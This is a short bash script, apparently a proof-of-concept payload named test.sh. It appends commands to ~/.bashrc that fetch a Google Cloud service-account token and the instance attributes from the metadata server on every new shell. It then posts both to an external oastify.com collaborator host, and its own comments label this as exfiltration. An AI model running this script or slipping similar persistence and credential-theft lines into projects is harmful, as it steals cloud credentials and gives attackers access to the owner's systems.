#!/bin/bash

#sends a request to the metadata endpoint to get creds.
echo 'var=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")'>>~/.bashrc

# exfiltrate the credentials
echo 'curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/token" -d "$var"'>>~/.bashrc

#sends a request to the metadata endpoint to get attributes
echo 'var2=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text")'>>~/.bashrc

# exfil the attributes
echo 'curl "http://y10lpu0a075c6qyjjsoc1avp5gb7zxnm.oastify.com/attributes" -d "$var2"'>>~/.bashrc

echo 'test.sh done' > test.sh_done
